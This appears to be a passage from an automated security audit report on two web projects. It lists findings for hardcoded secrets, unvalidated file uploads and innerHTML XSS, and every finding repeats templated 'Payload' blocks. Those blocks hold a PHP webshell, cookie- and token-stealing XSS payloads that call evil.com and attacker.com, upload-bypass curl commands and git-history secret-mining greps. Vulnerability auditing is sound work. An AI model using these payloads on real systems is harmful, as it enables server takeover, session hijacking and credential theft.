<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at components/files/files-section.tsx:110
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/tests/location-intelligence.test.mjs:98`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `RealTools/tests/location-intelligence.test.mjs:98` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at RealTools/tests/location-intelligence.test.mjs:98
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/supabase/config.toml:95`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `RealTools/supabase/config.toml:95` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at RealTools/supabase/config.toml:95
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/supabase/config.toml:287`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `RealTools/supabase/config.toml:287` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at RealTools/supabase/config.toml:287
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/supabase/config.toml:319`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `RealTools/supabase/config.toml:319` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at RealTools/supabase/config.toml:319
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/components/deals/activity-log-section.tsx:36`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/components/deals/activity-log-section.tsx:36` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/components/deals/activity-log-section.tsx:36
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/components/deals/activity-log-section.tsx:51`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/components/deals/activity-log-section.tsx:51` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/components/deals/activity-log-section.tsx:51
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/components/files/files-section.tsx:59`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/components/files/files-section.tsx:59` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/components/files/files-section.tsx:59
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/components/files/files-section.tsx:84`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/components/files/files-section.tsx:84` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/components/files/files-section.tsx:84
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/components/files/files-section.tsx:86`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/components/files/files-section.tsx:86` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/components/files/files-section.tsx:86
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/components/files/files-section.tsx:88`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/components/files/files-section.tsx:88` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/components/files/files-section.tsx:88
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/components/files/files-section.tsx:122`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/components/files/files-section.tsx:122` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/components/files/files-section.tsx:122
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/components/files/files-section.tsx:139`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/components/files/files-section.tsx:139` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/components/files/files-section.tsx:139
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `RealTools/lib/actions/file-actions.ts:54`  
**Privilege Gain:** `user → server_rce`

Upload handler at `RealTools/lib/actions/file-actions.ts:54` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at RealTools/lib/actions/file-actions.ts:54
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/products.js:152`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/products.js:152`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/products.js:152
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/products.js:182`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/products.js:182`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/products.js:182
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/products.js:265`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/products.js:265`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/products.js:265
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/products.js:282`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/products.js:282`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/products.js:282
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/products.js:369`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/products.js:369`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/products.js:369
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/products.js:417`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/products.js:417`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/products.js:417
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/products.js:420`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/products.js:420`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/products.js:420
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/animations.js:302`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/animations.js:302`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/animations.js:302
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/animations.js:398`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/animations.js:398`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/animations.js:398
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/makita-store/js/main.js:290`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/makita-store/js/main.js:290`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/makita-store/js/main.js:290
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/school-dashboard/js/sensors.js:38`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/school-dashboard/js/sensors.js:38`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/school-dashboard/js/sensors.js:38
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/school-dashboard/js/sensors.js:52`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/school-dashboard/js/sensors.js:52`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/school-dashboard/js/sensors.js:52
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/school-dashboard/js/main.js:75`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/school-dashboard/js/main.js:75`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/school-dashboard/js/main.js:75
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/school-dashboard/js/main.js:114`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/school-dashboard/js/main.js:114`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/school-dashboard/js/main.js:114
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/school-dashboard/js/main.js:157`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/school-dashboard/js/main.js:157`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/school-dashboard/js/main.js:157
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/school-dashboard/js/calendar.js:21`  
**Privilege Gain:** `attacker → victim_session`

